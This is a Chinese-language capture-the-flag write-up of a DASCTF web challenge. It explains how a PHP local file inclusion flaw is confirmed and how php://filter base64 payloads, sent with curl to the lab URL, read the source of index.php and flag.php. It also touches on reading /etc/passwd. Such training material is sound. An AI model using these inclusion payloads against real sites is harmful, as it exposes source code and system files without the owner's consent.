【DASCTF p参数文件包含】平台：dasctf｜难度：☆☆☆｜日期：2026-08-01

## 考点
LFI 文件包含（php://filter 读源码，绕过"包含即执行"）

## 我的思路
1. URL 带 `?p=hello`，参数值像文件名，响应是"hello world!" → 疑似文件包含
2. 对比验证：p=hello（存在→内容）vs p=test（不存在→空）→ 实锤 include
3. 读源码：php://filter 读 index.php → 解码看到 `include $p . ".php"`（自动加后缀）
4. 试探 flag：p=flag → "no no no" → 疑似过滤 OR flag.php 自身拦截
5. filter 读 flag.php 源码 → 解码 → "no no no" 是 flag.php 的 die()！flag 在注释里

flag：`n1book{afr_1_solved}`

## 解题过程（完整命令）

```bash
URL = https://0d415e36aaa4ee670831815f.http-ctf2.dasctf.com

# ① 确认文件包含（对比法）
curl.exe "$URL/?p=hello"        # hello world!（hello.php 存在）
curl.exe "$URL/?p=test"         # 空（test.php 不存在）

# ② 读 index.php 源码（核心招）
curl.exe -G "$URL/" --data-urlencode "p=php://filter/convert.base64-encode/resource=index"
# → PD9waHAK... （base64）

# ③ 解码
python -c "import base64; print(base64.b64decode('<base64>').decode())"
# → if(isset($_GET['p'])) { include (string)$_GET['p'] . ".php"; }
#   规则：自动加 .php 后缀

# ④ 试探 flag 文件
curl.exe "$URL/?p=flag"         # no no no（flag.php 存在！内容会拦截）

# ⑤ filter 读 flag.php 源码
curl.exe -G "$URL/" --data-urlencode "p=php://filter/convert.base64-encode/resource=flag"
# → PD9waHAKZGllKCdubyBubyBubycpOwovL24xYm9va3thZnJfMV9zb2x2ZWR9

# ⑥ 解码 → 真相 + flag
# <?php die('no no no'); //n1book{afr_1_solved}
```

## 关键复盘

### 1. "no no no" 不是 WAF，是 flag.php 自己的 die()
```
p=flag → include("flag.php") → 文件内容 = <?php die('no no no');
       → 被【执行】→ 输出 no no no 后终止
```
- 判断方法：filter 读它的源码，看内容而不是猜
- 做题教训：**先分清"过滤器"和"文件自身行为"**

### 2. 为什么必须 filter+base64
- 直接包含 PHP 文件 = 执行 → die 拦截/死循环/无输出
- filter+base64 = 把代码"消磁"成文本 → include 只能原样输出 → 看到源码

### 3. 后缀自动追加的应对
- 代码 `include $p . ".php"` → 传 `resource=flag`（不带 .php）会被拼全
- 想读非 PHP 文件（/etc/passwd）会被后缀坑 → 也要靠 filter 拼路径

### 4. 新收获
- php://filter 语法三件套：`php://filter/过滤器/resource=文件`
- `php://resource=xxx` / `php://index.php` 不是合法通道 → 失败
- 过滤规则要实测（xxflagxx 通过 = 精确匹配过滤）

## 对应专栏
hc-web/include.md（文件包含）—— LFI 题型，php://filter 读源码是标准第一招
